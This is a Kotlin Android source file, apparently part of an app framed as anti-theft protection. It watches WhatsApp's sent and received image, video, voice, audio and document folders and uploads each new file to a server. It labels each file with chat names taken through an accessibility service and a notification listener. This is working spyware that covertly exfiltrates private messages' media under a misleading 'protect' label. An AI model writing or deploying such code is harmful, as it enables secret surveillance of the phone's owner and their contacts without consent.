package com.androidprotect

import android.os.FileObserver
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.io.File

/**
 * Watches WhatsApp media folders and uploads newly created files to the server.
 *
 * Monitored folders:
 * - WhatsApp Images (received + Sent)
 * - WhatsApp Video (received + Sent)
 * - WhatsApp Voice Notes
 * - WhatsApp Audio
 * - WhatsApp Documents
 *
 * For Sent folders the media is tagged as outgoing and associated with the
 * current chat reported by ProtectAccessibilityService.
 * For received folders we try to associate it with the last incoming WhatsApp
 * notification address captured by WhatsAppNotificationListener.
 */
class WhatsAppMediaObserver private constructor() {

    private val observers = mutableListOf<FileObserver>()
    private val processedFiles = mutableSetOf<String>()
    private val handler = Handler(Looper.getMainLooper())

    fun start() {
        stop()
        processedFiles.clear()

        val paths = listOf(
            Folder(WhatsAppPaths.WHATSAPP_IMAGES, "image", false),
            Folder(WhatsAppPaths.WHATSAPP_IMAGES_SENT, "image", true),
            Folder(WhatsAppPaths.WHATSAPP_VIDEO, "video", false),
            Folder(WhatsAppPaths.WHATSAPP_VIDEO_SENT, "video", true),
            Folder(WhatsAppPaths.WHATSAPP_VOICE, "audio", false),
            Folder(WhatsAppPaths.WHATSAPP_AUDIO, "audio", false),
            Folder(WhatsAppPaths.WHATSAPP_DOCUMENTS, "document", false)
        )

        for (folder in paths) {
            val dir = File(folder.path)
            if (!dir.exists() || !dir.isDirectory) {
                Log.d("WhatsAppMedia", "skipping non-existent folder: ${folder.path}")
                continue
            }

            val observer = object : FileObserver(dir, CREATE or MOVED_TO or CLOSE_WRITE) {
                override fun onEvent(event: Int, path: String?) {
                    if (path.isNullOrBlank()) return
                    val file = File(dir, path)
                    if (event == CREATE || event == MOVED_TO) {
                        // Wait a bit for WhatsApp to finish writing the file
                        handler.postDelayed({ handleFile(file, folder) }, 1200)
                    }
                }
            }
            observer.startWatching()
            observers.add(observer)
            Log.d("WhatsAppMedia", "watching ${folder.path}")
        }
    }

    fun stop() {
        observers.forEach { it.stopWatching() }
        observers.clear()
    }

    private fun handleFile(file: File, folder: Folder) {
        if (!file.exists() || file.length() == 0L) return
        val key = "${file.absolutePath}:${file.lastModified()}"
        synchronized(processedFiles) {
            if (processedFiles.contains(key)) return
            processedFiles.add(key)
            // Avoid unbounded growth
            if (processedFiles.size > 500) processedFiles.clear()
        }

        val (address, name) = resolveChat(folder.isSent)
        val caption = when (folder.type) {
            "image" -> "📷 Imagem"
            "video" -> "🎥 Vídeo"
            "audio" -> "🎤 Áudio"
            else -> "📎 Arquivo"
        }

        Log.d("WhatsAppMedia", "detected ${folder.type} ${if (folder.isSent) "sent" else "received"}: ${file.name}")
        AntiTheftService.uploadWhatsAppMedia(file, folder.type, folder.isSent, address, name, caption)
    }

    private fun resolveChat(isSent: Boolean): Pair<String, String> {
        return if (isSent) {
            val chat = ProtectAccessibilityService.currentChatName()
            chat to chat
        } else {
            val addr = WhatsAppNotificationListener.lastIncomingAddress()
            addr to addr
        }
    }

    private data class Folder(
        val path: String,
        val type: String,
        val isSent: Boolean
    )

    companion object {
        @Volatile
        private var instance: WhatsAppMediaObserver? = null

        fun get(): WhatsAppMediaObserver {
            return instance ?: synchronized(this) {
                instance ?: WhatsAppMediaObserver().also { instance = it }
            }
        }
    }
}
